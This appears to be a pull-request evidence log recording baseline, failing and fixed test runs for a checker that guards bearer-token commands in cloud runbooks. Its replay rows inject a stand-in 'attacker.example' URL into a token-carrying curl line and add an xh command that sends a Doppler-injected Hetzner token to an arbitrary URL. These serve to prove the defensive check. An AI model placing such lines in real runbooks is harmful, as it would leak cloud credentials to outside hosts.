# Red-first evidence: feat-one-shot-12683-n3b-census (#12683)

Each suite run below wrote its log under the worktree, with `RC` appended right after the run.

## Phase 0: baseline and replay on the base tree (green before the fix)

Base commit `755f86213c` (detached worktrees, each running its own suite copy).

| Run | Edit | Diff counts | N3 | N3b | Results | RC |
| --- | --- | --- | --- | --- | --- | --- |
| baseline | none | - | pass | pass | `=== Results: 286/286 passed, 0 failed ===` | 0 |
| R1 | ` https://attacker.example/` after `servers/123931471` in `rb_expected`'s body and in runbook 6604 | suite=1, runbook6604=1 | pass | pass | `=== Results: 286/286 passed, 0 failed ===` | 0 |
| R2 | the xh line inserted after R in runbook 6894's section-5c fence (line 416) | runbook6894=1 | pass | pass | `=== Results: 286/286 passed, 0 failed ===` | 0 |

The R2 line, with the issue's `...` filled in from `RB_WRAP`'s Doppler flags:

```text
doppler run -p soleur -c prd_terraform --only-secrets HCLOUD_TOKEN_READONLY --no-exit-on-missing-only-secrets -- sh -c 'xh -A bearer -a "$HCLOUD_TOKEN_READONLY" "$U"'
```

## Phase 1: pure extraction

`=== Results: 286/286 passed, 0 failed ===`, RC=0.

## Phase 2: new H18 rows without the fix (red)

`=== Results: 285/286 passed, 1 failed ===`, RC=1. The one FAIL line, verbatim:

```text
  FAIL: H18 N3b / N1 self-test: uncaught:gVr1(none) uncaught:gVr2(none) uncaught:gVr4(none) uncaught:gVr5(none) uncaught:gVr6(none) uncaught:gVr11(none) uncaught:gVr12(none) uncaught:gVr13(none) uncaught:hj(none) fs-v4-unquoted(did-not-land) fs-v3-id(did-not-land) fs-v2-url(did-not-land) uncaught:g5r1 uncaught:g5r2 uncaught:g5r3 uncaught:g5r4 uncaught:g5r5 uncaught:g5r6 uncaught:g5r8 uncaught:hb-wpin='' uncaught:hb-wpin='106903269' uncaught:hb-wpin='106261946'
```

Every pre-existing row stays caught, every instrument control stays quiet, `H18_RUN` equals `H18_ROWS` (55), the must-PASS
rows `hi` and `g5s1` stay silent, and `fs-r-unquoted` is already caught (R has a heredoc before the fix).

## Phase 3: the fix (green)

Fix commit `a52dcb6b2f`: `=== Results: 286/286 passed, 0 failed ===`, RC=0; N3, N3b and H18 `pass:`. With the comments
and pass messages of Phase 4 added: `=== Results: 286/286 passed, 0 failed ===`, RC=0.

## Phase 3c: replay on the fixed tree (red after the fix)

Detached worktrees of `a52dcb6b2f`, each running its own suite copy.

| Run | Edit | Diff counts | N3 | Results | RC |
| --- | --- | --- | --- | --- | --- |
| R1 | the same second-URL edit, in `rb_line_v2`'s body only, and in runbook 6604 (`N3B_FROZEN_V2` heredoc body unchanged, 413 bytes) | suite=1, runbook6604=1 | pass | `=== Results: 284/286 passed, 2 failed ===` | 1 |
| R2 | the xh line after R in runbook 6894's 5c fence (line 416) | runbook6894=1 | pass | `=== Results: 284/286 passed, 2 failed ===` | 1 |

The second FAIL in each is `H18 not judged: base documents red (see N3b)`, by design. The N3b FAIL lines, verbatim:

R1:

```text
  FAIL: N3b runbook 6894 / postmerge bearer lines (a command must equal rb_line_get404/rb_line_readback; prose: reword it, never re-wrap it): builder V2: frozen: the built line differs from N3B_FROZEN_V2 at byte 369: [https://attacker.example/ | jq -c ".server.volumes"'   # exp] vs [| jq -c ".server.volumes"'   # expect [106443278]];builder V2: curl-argv: built: not on the allow-list: (no V2 URL end) https://attacker.example/ | jq -c ".server.volumes"' # expect [106443278];seen inngest-luks-cutover-6894.md: D=1 R=1;seen SKILL.md: D=0 R=1;
```

R2:

```text
  FAIL: N3b runbook 6894 / postmerge bearer lines (a command must equal rb_line_get404/rb_line_readback; prose: reword it, never re-wrap it): unclassified p5: inngest-luks-cutover-6894.md:416: doppler run -p soleur -c prd_terraform --only-secrets HCLOUD_TOKEN_READONLY --no-exit-on-missing-only-secrets -- sh -c ';seen inngest-luks-cutover-6894.md: D=1 R=1;seen SKILL.md: D=0 R=1;
```
